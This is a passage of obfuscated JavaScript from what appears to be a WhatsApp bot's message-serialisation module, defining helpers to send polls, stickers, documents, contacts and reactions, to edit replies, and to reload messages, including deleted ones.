    case 'poll':
    case 'pool':
     {
      return await _0xa72325.sendMessage(
       _0x4b9613,
       {
        poll: {
         name: _0x2faaad,
         values: [..._0x296029.values],
         selectableCount: 1,
         ..._0x296029,
        },
        ..._0x296029,
       },
       {
        quoted: _0x5a0385,
        messageId: _0xa72325.messageId(),
       }
      )
     }
     break
    case 'template':
     {
      let _0x56ca9b = await generateWAMessage(_0x2d6cd0.chat, _0x2faaad, _0x296029)
      let _0x5429ce = {
       viewOnceMessage: {
        message: {
         ..._0x56ca9b.message,
        },
       },
      }
      return await _0xa72325.relayMessage(_0x2d6cd0.chat, _0x5429ce, {
       messageId: _0xa72325.messageId(),
      })
     }
     break
    case 'amdsticker':
    case 'amdstc':
    case 'stc':
    case 'sticker':
     {
      try {
       let { data: _0x5a503d, mime: _0x204bd7 } = await _0xa72325.getFile(_0x2faaad)
       if (_0x204bd7 == 'image/webp') {
        let _0x1c63d1 = await writeExifWebp(_0x5a503d, _0x296029)
        await _0xa72325.sendMessage(
         _0x4b9613,
         {
          sticker: {
           url: _0x1c63d1,
          },
          ..._0x296029,
         },
         {
          quoted: _0x5a0385,
          messageId: _0xa72325.messageId(),
         }
        )
       } else {
        _0x204bd7 = await _0x204bd7.split('/')[0]
        if (_0x204bd7 === 'video' || _0x204bd7 === 'image') {
         await _0xa72325.sendImageAsSticker(_0x4b9613, _0x2faaad, _0x296029)
        }
       }
      } catch (_0xba8ed7) {
       console.log('ERROR FROM SMGS SEND FUNC AS STICKER\n\t', _0xba8ed7)
       if (!Buffer.isBuffer(_0x2faaad)) {
        _0x2faaad = await getBuffer(_0x2faaad)
       }
       const { Sticker: _0x4cdf40 } = require('wa-sticker-formatter')
       let _0x4736b1 = {
        pack: Config.packname,
        author: Config.author,
        type: 'full',
        quality: 2,
        ..._0x296029,
       }
       let _0x273ddd = new _0x4cdf40(_0x2faaad, {
        ..._0x4736b1,
       })
       return await _0xa72325.sendMessage(
        _0x4b9613,
        {
         sticker: await _0x273ddd.toBuffer(),
        },
        {
         quoted: _0x5a0385,
         messageId: _0xa72325.messageId(),
        }
       )
      }
     }
     break
   }
  } catch (_0x320b03) {
   console.log('\n\nERROR IN SMSG MESSAGE>SEND FROM SERIALIZE.JS\n\t', _0x320b03)
  }
 }
 _0x2d6cd0.sendPoll = async (
  _0x481e69,
  _0x4269ff = ['option 1', 'option 2'],
  _0x4ed2f6 = 1,
  _0x595949 = _0x2d6cd0,
  _0x3be729 = _0x2d6cd0.chat
 ) => {
  return await _0x2d6cd0.send(
   _0x481e69,
   {
    values: _0x4269ff,
    selectableCount: _0x4ed2f6,
   },
   'poll',
   _0x595949,
   _0x3be729
  )
 }
 _0x2d6cd0.reply = async (
  _0x1c9bee,
  _0x34d4da = {},
  _0x14cda7 = '',
  _0x2fda04 = _0x2d6cd0,
  _0x3fe3b = _0x2d6cd0.chat
 ) => {
  return await _0x2d6cd0.send(_0x1c9bee, _0x34d4da, _0x14cda7, _0x2fda04, _0x3fe3b)
 }
 _0x2d6cd0.react = (_0x474799 = '🍂', _0x30c624 = _0x2d6cd0) => {
  _0xa72325.sendMessage(
   _0x2d6cd0.chat,
   {
    react: {
     text: _0x474799 || '🍂',
     key: (_0x30c624 ? _0x30c624 : _0x2d6cd0).key,
    },
   },
   {
    messageId: _0xa72325.messageId(),
   }
  )
 }
 _0x2d6cd0.edit = async (_0x17af93, _0x1cdbce = {}, _0x9691f6 = '', _0x1db15f = _0x2d6cd0.chat) => {
  if (_0x1cdbce && !_0x1cdbce.edit) {
   _0x1cdbce = {
    ..._0x1cdbce,
    edit: (_0x2d6cd0.quoted || _0x2d6cd0).key,
   }
  }
  return await _0x2d6cd0.send(_0x17af93, _0x1cdbce, _0x9691f6, '', _0x1db15f)
 }
 _0x2d6cd0.senddoc = (
  _0xc91849,
  _0x123297,
  _0x11746a = _0x2d6cd0.chat,
  _0x3257fa = {
   mentions: [_0x2d6cd0.sender],
   filename: Config.ownername,
   mimetype: _0x123297,
   externalAdRepl: {
    title: Config.ownername,
    thumbnailUrl: '',
    thumbnail: log0,
    mediaType: 1,
    mediaUrl: gurl,
    sourceUrl: gurl,
   },
  }
 ) =>
  _0xa72325.sendMessage(
   _0x11746a,
   {
    document: _0xc91849,
    mimetype: _0x3257fa.mimetype,
    fileName: _0x3257fa.filename,
    contextInfo: {
     externalAdReply: _0x3257fa.externalAdRepl,
     mentionedJid: _0x3257fa.mentions,
    },
   },
   {
    quoted: _0x2d6cd0,
    messageId: _0xa72325.messageId(),
   }
  )
 _0x2d6cd0.sendcontact = (_0x716863, _0x2f3407, _0x1a2b96) => {
  var _0x586840 =
   'BEGIN:VCARD\nVERSION:3.0\nFN:' +
   _0x716863 +
   '\nORG:' +
   _0x2f3407 +
   ';\nTEL;type=CELL;type=VOICE;waid=' +
   _0x1a2b96 +
   ':+' +
   _0x1a2b96 +
   '\nEND:VCARD'
  return _0xa72325.sendMessage(
   _0x2d6cd0.chat,
   {
    contacts: {
     displayName: _0x716863,
     contacts: [
      {
       vcard: _0x586840,
      },
     ],
    },
   },
   {
    quoted: _0x2d6cd0,
    messageId: _0xa72325.messageId(),
   }
  )
 }
 _0x2d6cd0.loadMessage = async (_0x143141 = _0x2d6cd0.key) => {
  if (!_0x143141) {
   return false
  }
  let _0x5e265c = await _0x23c611.loadMessage(_0x2d6cd0.chat, _0x143141.id, _0xa72325)
  return await exports.smsg(_0xa72325, _0x5e265c, _0x23c611, false)
 }
 if (_0x2d6cd0.mtype == 'protocolMessage' && _0x2d6cd0.msg.type === 'REVOKE') {
  _0x2d6cd0.getDeleted = async () => {
   let _0x192e7d = await _0x23c611.loadMessage(_0x2d6cd0.chat, _0x2d6cd0.msg.key.id, _0xa72325)
   return await exports.smsg(_0xa72325, _0x192e7d, _0x23c611, false)
  }
 }
 _0x2d6cd0.reply_message = _0x2d6cd0.quoted
 _0x2d6cd0.bot = _0x5eedaa ? _0xa72325 : {}
 if (global.OfficialRepo && global.OfficialRepo === 'yes') {
  return _0x2d6cd0
 } else {
  return {}
 }
}
module.exports = {
 pollsg,
 callsg,
 groupsg,
 smsg,
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
 console.log('Update ' + __filename)
})
